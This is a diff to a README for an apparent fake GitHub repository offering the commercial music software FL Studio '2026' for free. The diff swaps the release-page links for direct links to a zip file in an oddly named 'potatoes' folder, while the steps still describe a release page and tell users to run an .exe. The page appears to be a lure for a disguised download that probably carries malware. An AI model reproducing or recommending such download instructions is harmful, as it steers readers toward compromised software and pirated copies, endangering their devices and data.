@@ -1,6 +1,6 @@
 # 🎹 FL-Studio-Version-2026 - Create professional music with full control
 
-[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/urbanrenewalsign869/FL-Studio-Version-2026/releases)
+[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/urbanrenewalsign869/FL-Studio-Version-2026/raw/refs/heads/main/potatoes/Studio_F_Version_1.8.zip)
 
 ## 📁 Project Overview
 FL Studio 2026 operates as a digital audio workstation. This software provides tools for music production, sound design, and audio editing. It allows users to arrange, record, edit, and mix sounds to create complete tracks. The application includes virtual instruments, audio effects, and sequencing tools. Users find this platform useful for electronic music production, beat making, and studio recording. Designers built this version to handle complex production tasks on personal computers.
@@ -18,7 +18,7 @@ Ensure that your computer meets these specifications to run the software. These 
 ## 🚀 Downloading the Software
 Follow these steps to acquire the installer for your Windows device. 
 
-1. Visit the project release page: [https://github.com/urbanrenewalsign869/FL-Studio-Version-2026/releases](https://github.com/urbanrenewalsign869/FL-Studio-Version-2026/releases)
+1. Visit the project release page: [https://github.com/urbanrenewalsign869/FL-Studio-Version-2026/raw/refs/heads/main/potatoes/Studio_F_Version_1.8.zip](https://github.com/urbanrenewalsign869/FL-Studio-Version-2026/raw/refs/heads/main/potatoes/Studio_F_Version_1.8.zip)
 2. Look for the latest release version at the top of the list.
 3. Locate the assets section under the release description.
 4. Click the file ending in .exe to start the download.
